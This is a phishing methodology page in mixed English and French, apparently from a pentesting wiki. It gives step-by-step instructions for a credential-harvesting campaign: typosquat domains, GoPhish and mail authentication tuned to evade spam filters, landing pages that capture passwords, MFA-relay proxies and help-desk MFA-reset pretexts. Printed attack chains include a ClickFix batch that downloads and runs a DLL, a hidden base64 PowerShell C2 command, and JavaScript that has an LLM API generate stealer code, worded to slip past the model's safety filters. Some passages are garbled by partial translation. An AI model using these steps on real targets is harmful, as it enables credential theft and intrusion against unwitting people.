# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon the victim
1. Select the **victim domain**.
2. Perform some basic web enumeration **searching for login portals** used by the victim and **decide** which one you will **impersonate**.
3. Use some **OSINT** to **find emails**.
2. Prepare the environment
1. **Buy the domain** you are going to use for the phishing assessment
2. **Configure the email service** related records (SPF, DMARC, DKIM, rDNS)
3. Configure the VPS with **gophish**
3. Prepare the campaign
1. Prepare the **email template**
2. Prepare the **web page** to steal the credentials
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: The domain name **contains** an important **keyword** of the original domain (e.g., zelster.com-management.com).
- **hypened subdomain**: Change the **dot for a hyphen** of a subdomain (e.g., www-zelster.com).
- **New TLD**: Same domain using a **new TLD** (e.g., zelster.org)
- **Homoglyph**: It **replaces** a letter in the domain name with **letters that look similar** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** It **swaps two letters** within the domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Adds or removes “s” at the end of the domain name (e.g., zeltsers.com).
- **Omission**: It **removes one** of the letters from the domain name (e.g., zelser.com).
- **Repetition:** It **repeats one** of the letters in the domain name (e.g., zeltsser.com).
- **Replacement**: Like homoglyph but less stealthy. It replaces one of the letters in the domain name, perhaps with a letter in proximity of the original letter on the keyboard (e.g, zektser.com).
- **Subdomained**: Introduce a **dot** inside the domain name (e.g., ze.lster.com).
- **Insertion**: It **inserts a letter** into the domain name (e.g., zerltser.com).
- **Missing dot**: Append the TLD to the domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Il existe une **possibilité qu'un ou plusieurs bits stockés ou en communication soient automatiquement inversés** en raison de divers facteurs comme des éruptions solaires, des rayons cosmiques ou des erreurs matérielles.

Quand ce concept est **appliqué aux requêtes DNS**, il est possible que le **domaine reçu par le serveur DNS** ne soit pas le même que celui initialement demandé.

Par exemple, une modification d'un seul bit dans le domaine "windows.com" peut le changer en "windnws.com."

Les attaquants peuvent **profiter de cela en enregistrant plusieurs domaines bit-flipping** similaires au domaine de la victime. Leur intention est de rediriger les utilisateurs légitimes vers leur propre infrastructure.

Pour plus d'informations, lisez [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Vous pouvez chercher sur [https://www.expireddomains.net/](https://www.expireddomains.net) un domaine expiré que vous pourriez utiliser.\
Afin de vous assurer que le domaine expiré que vous allez acheter **a déjà un bon SEO**, vous pouvez vérifier comment il est classé dans :

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Afin de **découvrir davantage** d'adresses email valides ou de **vérifier celles** que vous avez déjà découvertes, vous pouvez vérifier si vous pouvez les bruteforce sur les serveurs smtp de la victime. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
De plus, n'oubliez pas que si les utilisateurs utilisent **un portail web quelconque pour accéder à leurs mails**, vous pouvez vérifier s'il est vulnérable au **username brute force**, et exploiter la vulnérabilité si possible.

## Configuring GoPhish

### Installation

Vous can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Téléchargez-le et décompressez-le dans `/opt/gophish` puis exécutez `/opt/gophish/gophish`\
Un mot de passe vous sera fourni pour l'utilisateur admin sur le port 3333 dans la sortie. Par conséquent, accédez à ce port et utilisez ces identifiants pour modifier le mot de passe admin. Vous devrez peut-être tunneler ce port vers local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**Configuration du certificat TLS**

Avant cette étape, vous devez avoir **déjà acheté le domaine** que vous allez utiliser et il doit **pointer** vers l’**IP du VPS** où vous configurez **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configuration du mail**

Commencez par installer : `apt-get install postfix`

Puis ajoutez le domaine aux fichiers suivants :

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Modifiez aussi les valeurs des variables suivantes dans /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Enfin, modifiez les fichiers **`/etc/hostname`** et **`/etc/mailname`** avec le nom de votre domaine et **redémarrez votre VPS.**

Maintenant, créez un **enregistrement DNS A** de `mail.<domain>` pointant vers l'**adresse IP** du VPS et un **enregistrement DNS MX** pointant vers `mail.<domain>`

Maintenant, testons l'envoi d'un email :
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configuration de Gophish**

Arrête l’exécution de gophish et configurons-le.\
Modifie `/opt/gophish/config.json` comme suit (note l’utilisation de https) :
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configurer le service gophish**

Afin de créer le service gophish pour qu’il puisse être démarré automatiquement et géré comme un service, vous pouvez créer le fichier `/etc/init.d/gophish` avec le contenu suivant :
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Terminez la configuration du service et vérifiez-le en faisant :
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configuring mail server and domain

### Wait & be legit

Plus un domaine est ancien, moins il a de chances d’être détecté comme spam. Vous devriez donc attendre le plus longtemps possible (au moins 1 semaine) avant l’évaluation de phishing. moreover, si vous mettez une page sur un secteur de bonne réputation, la réputation obtenue sera meilleure.

Notez que même si vous devez attendre une semaine, vous pouvez terminer la configuration de tout maintenant.

### Configure Reverse DNS (rDNS) record

Définissez un enregistrement rDNS (PTR) qui résout l’adresse IP du VPS vers le nom de domaine.

### Sender Policy Framework (SPF) Record

Vous devez **configurer un SPF record pour le nouveau domaine**. Si vous ne savez pas ce qu’est un SPF record, [**lisez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Vous pouvez utiliser [https://www.spfwizard.net/](https://www.spfwizard.net) pour générer votre politique SPF (utilisez l’IP de la machine VPS)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

This is the content that must be set inside a TXT record inside the domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Enregistrement Domain-based Message Authentication, Reporting & Conformance (DMARC)

Vous devez **configurer un enregistrement DMARC pour le nouveau domaine**. Si vous ne savez pas ce qu’est un enregistrement DMARC, [**lisez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Vous devez créer un nouvel enregistrement DNS TXT pointant le hostname `_dmarc.<domain>` avec le contenu suivant :
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Vous devez **configurer un DKIM pour le nouveau domaine**. Si vous ne savez pas ce qu’est un enregistrement DMARC [**lisez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ce tutoriel est basé sur : [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Vous devez concaténer les deux valeurs B64 que la clé DKIM génère :
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testez votre score de configuration email

Vous pouvez faire cela en utilisant [https://www.mail-tester.com/](https://www.mail-tester.com)\
Accédez simplement à la page et envoyez un email à l’adresse qu’ils vous donnent :
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Vous pouvez également **vérifier votre configuration email** en envoyant un email à `check-auth@verifier.port25.com` et en **lisant la réponse** (pour cela, vous devrez **ouvrir** le port **25** et voir la réponse dans le fichier _/var/mail/root_ si vous envoyez l'email en tant que root).\
Vérifiez que vous réussissez tous les tests :
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Vous pourriez aussi envoyer un **message à un Gmail sous votre contrôle**, et vérifier les **en-têtes de l’e-mail** dans votre boîte de réception Gmail, `dkim=pass` devrait être présent dans le champ d’en-tête `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) peut indiquer si votre domaine est bloqué par spamhouse. Vous pouvez demander la suppression de votre domaine/IP à : ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​Vous pouvez demander la suppression de votre domaine/IP à [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Définissez un **nom pour identifier** le profil d'expéditeur
- Décidez depuis quel compte vous allez envoyer les emails de phishing. Suggestions : _noreply, support, servicedesk, salesforce..._
- Vous pouvez laisser le nom d'utilisateur et le mot de passe vides, mais assurez-vous de cocher Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Il est recommandé d'utiliser la fonctionnalité "**Send Test Email**" pour vérifier que tout fonctionne.\
> Je recommanderais d'**envoyer les emails de test à des adresses mail temporaires de 10 min** afin d'éviter d'être blacklisted pendant les tests.

### Email Template

- Définissez un **nom pour identifier** le template
- Puis écrivez un **objet** (rien d'étrange, juste quelque chose que l'on pourrait s'attendre à lire dans un email normal)
- Assurez-vous d'avoir coché "**Add Tracking Image**"
- Écrivez le **template email** (vous pouvez utiliser des variables comme dans l'exemple suivant) :
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Notez que **afin d'augmenter la crédibilité de l'email**, il est recommandé d'utiliser une signature provenant d'un email du client. Suggestions :

- Envoyer un email à une **adresse inexistante** et vérifier si la réponse contient une signature.
- Rechercher des **emails publics** comme info@ex.com ou press@ex.com ou public@ex.com et leur envoyer un email, puis attendre la réponse.
- Essayer de contacter **un email valide découvert** et attendre la réponse

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Le Email Template permet aussi de **joindre des fichiers à envoyer**. Si vous souhaitez également voler des défis NTLM à l'aide de fichiers/documents spécialement conçus [lisez cette page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Écrire un **nom**
- **Écrire le code HTML** de la page web. Notez que vous pouvez **importer** des pages web.
- Cocher **Capture Submitted Data** et **Capture Passwords**
- Définir une **redirection**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> En général, vous devrez modifier le code HTML de la page et faire des tests en local (peut-être en utilisant un serveur Apache) **jusqu'à obtenir un résultat satisfaisant.** Ensuite, écrivez ce code HTML dans la boîte.\
> Notez que si vous devez **utiliser des ressources statiques** pour le HTML (peut-être des pages CSS et JS), vous pouvez les enregistrer dans _**/opt/gophish/static/endpoint**_ puis y accéder depuis _**/static/\<filename>**_

> [!TIP]
> Pour la redirection, vous pourriez **rediriger les utilisateurs vers la page web principale légitime** de la victime, ou les rediriger vers _/static/migration.html_ par exemple, mettre une **roue de chargement (**[**https://loading.io/**](https://loading.io)**) pendant 5 secondes puis indiquer que le processus a réussi**.

### Users & Groups

- Définir un nom
- **Importer les données** (notez que pour utiliser le modèle de l'exemple, vous avez besoin du prénom, du nom et de l'adresse email de chaque utilisateur)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Enfin, créez une campagne en sélectionnant un nom, le email template, la landing page, l'URL, le sending profile et le groupe. Notez que l'URL sera le lien envoyé aux victimes

Notez que le **Sending Profile permet d'envoyer un email de test pour voir à quoi ressemblera le email phishing final** :

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Je recommanderais d'**envoyer les emails de test à des adresses 10min mails** afin d'éviter d'être blacklisté pendant les tests.

Une fois que tout est prêt, lancez simplement la campagne !

## Website Cloning

Si pour une raison quelconque vous voulez cloner le website, consultez la page suivante :


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Dans certaines évaluations de phishing (principalement pour les Red Teams), vous voudrez aussi **envoyer des fichiers contenant une sorte de backdoor** (peut-être un C2 ou peut-être juste quelque chose qui déclenchera une authentification).\
Consultez la page suivante pour quelques exemples :


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

L'attaque précédente est assez astucieuse car vous imitez un vrai website et récupérez les informations saisies par l'utilisateur. Malheureusement, si l'utilisateur n'a pas saisi le bon mot de passe ou si l'application que vous imitez est configurée avec 2FA, **ces informations ne vous permettront pas de vous faire passer pour l'utilisateur piégé**.

C'est là que des outils comme [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) et [**muraena**](https://github.com/muraenateam/muraena) sont utiles. Cet outil vous permettra de générer une attaque de type MitM. En gros, l'attaque fonctionne de la manière suivante :

1. Vous **imitez la connexion** du vrai webpage.
2. L'utilisateur **envoie** ses **credentials** à votre fausse page et l'outil les envoie au vrai webpage, **vérifiant si les credentials fonctionnent**.
3. Si le compte est configuré avec **2FA**, la page MitM le demandera et une fois que **l'utilisateur le saisit**, l'outil l'enverra au vrai web page.
4. Une fois l'utilisateur authentifié, vous (en tant qu'attaquant) aurez **capturé les credentials, la 2FA, le cookie et toute information** issue de chaque interaction pendant que l'outil réalise une attaque MitM.

### Via VNC

Et si, au lieu d'**envoyer la victime vers une page malveillante** avec le même aspect que l'originale, vous l'envoyiez vers une **session VNC avec un browser connecté au vrai web page** ? Vous pourrez voir ce qu'il fait, voler le mot de passe, le MFA utilisé, les cookies...\
Vous pouvez faire cela avec [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Évidemment, l'un des meilleurs moyens de savoir si vous avez été démasqué est de **rechercher votre domaine dans des blacklists**. S'il apparaît listé, cela signifie d'une manière ou d'une autre que votre domaine a été détecté comme suspect.\
Un moyen simple de vérifier si votre domaine apparaît dans une blacklist est d'utiliser [https://malwareworld.com/](https://malwareworld.com)

Cependant, il existe d'autres moyens de savoir si la victime **recherche activement des suspicions phishing activity dans la nature** comme expliqué dans :


{{#ref}}
detecting-phising.md
{{#endref}}

Vous pouvez **acheter un domaine avec un nom très similaire** au domain de la victime **et/ou générer un certificat** pour un **sous-domaine** d'un domaine contrôlé par vous **contenant** le **keyword** du domain de la victime. Si la **victime** effectue une interaction **DNS ou HTTP** avec eux, vous saurez qu'elle **recherche activement** des domaines suspects et vous devrez être très discret.

### Evaluate the phishing

Utilisez [**Phishious** ](https://github.com/Rices/Phishious) pour évaluer si votre email va finir dans le dossier spam ou s'il va être bloqué ou réussir.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Les groupes d'intrusion modernes sautent de plus en plus complètement les leurres par email et **ciblent directement le workflow du service desk / identity recovery** pour contourner la MFA. L'attaque est entièrement "living-off-the-land" : une fois que l'opérateur possède des credentials valides, il rebondit avec des outils d'administration intégrés – aucun malware n'est requis.

### Attack flow
1. Recon de la victime
* Collecter des détails personnels et professionnels depuis LinkedIn, des fuites de données, GitHub public, etc.
* Identifier les identités à forte valeur (dirigeants, IT, finance) et recenser le **processus exact du help-desk** pour le reset du mot de passe / MFA.
2. Ingénierie sociale en temps réel
* Appeler, envoyer un message sur Teams ou via chat au help-desk tout en usurpant l'identité de la cible (souvent avec un **caller-ID spoofed** ou une **voix clonée**).
* Fournir les informations personnelles (PII) précédemment collectées pour passer la vérification basée sur les connaissances.
* Convaincre l'agent de **reset le secret MFA** ou d'effectuer un **SIM-swap** sur un numéro mobile enregistré.
3. Actions immédiates après accès (≤60 min dans des cas réels)
* Établir un point d'appui via n'importe quel portail web SSO.
* Énumérer AD / AzureAD avec les outils intégrés (aucun binaire déposé) :
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Mouvement latéral avec **WMI**, **PsExec**, ou des agents **RMM** légitimes déjà autorisés dans l'environnement.

### Detection & Mitigation
* Traiter la récupération d'identité du help-desk comme une **opération privilégiée** – exiger une authentification renforcée et l'approbation d'un manager.
* Déployer des règles **Identity Threat Detection & Response (ITDR)** / **UEBA** qui alertent sur :
* Changement de méthode MFA + authentification depuis un nouvel appareil / une nouvelle géo.
* Élévation immédiate du même principal (user-→-admin).
* Enregistrer les appels au help-desk et imposer un **rappel vers un numéro déjà enregistré** avant tout reset.
* Mettre en place **Just-In-Time (JIT) / Privileged Access** afin que les comptes nouvellement reset n'héritent pas automatiquement de jetons à privilèges élevés.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Les groupes commoditaires compensent le coût des opérations high-touch avec des attaques de masse qui transforment **les moteurs de recherche et les réseaux publicitaires en canal de livraison**.

1. **SEO poisoning / malvertising** pousse un faux résultat comme `chromium-update[.]site` en tête des annonces de recherche.
2. La victime télécharge un petit **first-stage loader** (souvent JS/HTA/ISO). Exemples observés par Unit 42 :
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Le loader exfiltre les cookies du browser + les bases de données de credentials, puis récupère un **silent loader** qui décide – *en temps réel* – s'il faut déployer :
* RAT (par ex. AsyncRAT, RustDesk)
* ransomware / wiper
* composant de persistance (clé Run du registre + tâche planifiée)

### Hardening tips
* Bloquer les domaines nouvellement enregistrés et appliquer **Advanced DNS / URL Filtering** sur les *search-ads* ainsi que sur l'e-mail.
* Restreindre l'installation de logiciels aux packages MSI / Store signés, interdire par politique l'exécution de `HTA`, `ISO`, `VBS`.
* Surveiller les processus enfants des browsers qui ouvrent des installateurs :
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Chasser les LOLBins fréquemment abusés par les first-stage loaders (par ex. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure : advisory CERT national cloné avec un bouton **Update** qui affiche des instructions de “fix” étape par étape. Les victimes sont invitées à exécuter un batch qui télécharge une DLL et l'exécute via `rundll32`.
* Chaîne batch typique observée :
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` dépose la payload dans `%TEMP%`, une courte pause masque la latence réseau, puis `rundll32` appelle l'entrypoint exporté (`notepad`).
* La DLL beacon l'identité de l'hôte et interroge le C2 toutes les quelques minutes. Les ordres distants arrivent sous forme de **PowerShell encodé en base64** exécuté en mode masqué et avec bypass de politique :
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Cela conserve la flexibilité du C2 (le serveur peut changer les tâches sans mettre à jour la DLL) et masque les fenêtres de console. Recherchez les enfants PowerShell de `rundll32.exe` utilisant ensemble `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Les défenseurs peuvent rechercher des callbacks HTTP(S) de la forme `...page.php?tynor=<COMPUTER>sss<USER>` et des intervalles de polling de 5 minutes après le chargement de la DLL.

---

## AI-Enhanced Phishing Operations
Les attaquants enchaînent désormais des APIs de **LLM & voice-clone** pour des leurres entièrement personnalisés et une interaction en temps réel.

| Layer | Exemple d'utilisation par un acteur malveillant |
|-------|-----------------------------------------------|
|Automation|Générer et envoyer >100 k emails / SMS avec un wording randomisé et des tracking links.|
|Generative AI|Produire des emails *one-off* faisant référence à des M&A publiques, à des private jokes issues des réseaux sociaux ; voix deep-fake de CEO dans une arnaque au callback.|
|Agentic AI|Enregistrer de façon autonome des domaines, scraper de l'intel open-source, créer les mails de l'étape suivante lorsqu'une victime clique mais ne soumet pas ses creds.|

**Defense :**
• Ajouter des **bannières dynamiques** mettant en évidence les messages envoyés depuis une automatisation non fiable (via des anomalies ARC/DKIM).
• Déployer des phrases de défi de **voice-biometric** pour les demandes téléphoniques à haut risque.
• Simuler en continu des leurres générés par IA dans les programmes de sensibilisation – les modèles statiques sont obsolètes.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Les attaquants peuvent envoyer du HTML apparemment bénin et **générer le stealer au runtime** en demandant à une **trusted LLM API** du JavaScript, puis en l'exécutant dans le browser (par ex. `eval` ou `<script>` dynamique).

1. **Prompt-as-obfuscation :** encoder les exfil URLs/Base64 strings dans le prompt ; faire varier le wording pour contourner les filtres de sécurité et réduire les hallucinations.
2. **Appel d'API côté client :** au chargement, le JS appelle un LLM public (Gemini/DeepSeek/etc.) ou un proxy CDN ; seul le prompt/l'appel API est présent dans le HTML statique.
3. **Assembler & exec :** concaténer la réponse et l'exécuter (polymorphique à chaque visite) :
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** le code généré personnalise le leurre (par ex., parsing de token LogoKit) et envoie les creds vers le endpoint caché dans le prompt.

**Caractéristiques d’évasion**
- Le trafic atteint des domaines LLM well-known ou des proxies CDN réputés ; parfois via WebSockets vers un backend.
- Aucun payload statique ; le JS malveillant n’existe qu’après le rendu.
- Les générations non déterministes produisent des stealers **uniques** par session.

**Idées de détection**
- Exécuter des sandboxes avec JS activé ; signaler le **`eval` runtime / la création de script dynamique provenant des réponses LLM**.
- Rechercher les POST front-end vers des API LLM immédiatement suivis de `eval`/`Function` sur le texte retourné.
- Déclencher une alerte sur les domaines LLM non autorisés dans le trafic client, puis sur les POST de credentials qui suivent.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
En plus du push-bombing classique, les opérateurs **forcent simplement une nouvelle inscription MFA** pendant l’appel au help-desk, annulant le token existant de l’utilisateur. Tout prompt de connexion ultérieur paraît légitime à la victime.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Surveillez les événements AzureAD/AWS/Okta où **`deleteMFA` + `addMFA`** se produisent **en quelques minutes depuis la même IP**.



## Clipboard Hijacking / Pastejacking

Les attaquants peuvent copier silencieusement des commandes malveillantes dans le presse-papiers de la victime depuis une page web compromise ou typosquattée, puis tromper l’utilisateur pour qu’il les colle dans une fenêtre **Win + R**, **Win + X** ou un terminal, exécutant ainsi du code arbitraire sans aucun téléchargement ni pièce jointe.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Une page leurre (par ex. un faux canal ministère/CERT) affiche un QR WhatsApp Web/Desktop et demande à la victime de le scanner, ajoutant silencieusement l’attaquant comme **linked device**.
* L’attaquant obtient immédiatement la visibilité sur les chats/contacts jusqu’à ce que la session soit supprimée. Les victimes peuvent plus tard voir une notification de « new device linked » ; les défenseurs peuvent rechercher des événements inattendus de device-link peu après des visites de pages QR non fiables.

### Mobile‑gated phishing to evade crawlers/sandboxes
Les opérateurs placent de plus en plus leurs flux de phishing derrière une simple vérification de device afin que les crawlers desktop n’atteignent jamais les pages finales. Un schéma courant consiste en un petit script qui teste la présence d’un DOM compatible touch et envoie le résultat à un endpoint serveur ; les clients non mobiles reçoivent HTTP 500 (ou une page vide), tandis que les utilisateurs mobiles voient le flux complet.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logique (simplifiée):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportement du serveur souvent observé :
- Définit un cookie de session lors du premier chargement.
- Accepte `POST /detect {"is_mobile":true|false}`.
- Retourne 500 (ou un placeholder) aux GET suivants quand `is_mobile=false`; ne sert le phishing que si `true`.

Heuristiques de hunting et de détection :
- Requête urlscan : `filename:"detect_device.js" AND page.status:500`
- Télémétrie web : séquence `GET /static/detect_device.js` → `POST /detect` → HTTP 500 pour non-mobile ; les chemins légitimes de victimes mobiles renvoient 200 avec HTML/JS en suivant.
- Bloquer ou examiner de près les pages qui conditionnent le contenu exclusivement sur `ontouchstart` ou des vérifications de périphérique similaires.

Conseils de défense :
- Exécuter les crawlers avec des empreintes de type mobile et JavaScript activé pour révéler le contenu protégé.
- Déclencher une alerte sur les réponses 500 suspectes après `POST /detect` sur des domaines nouvellement enregistrés.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
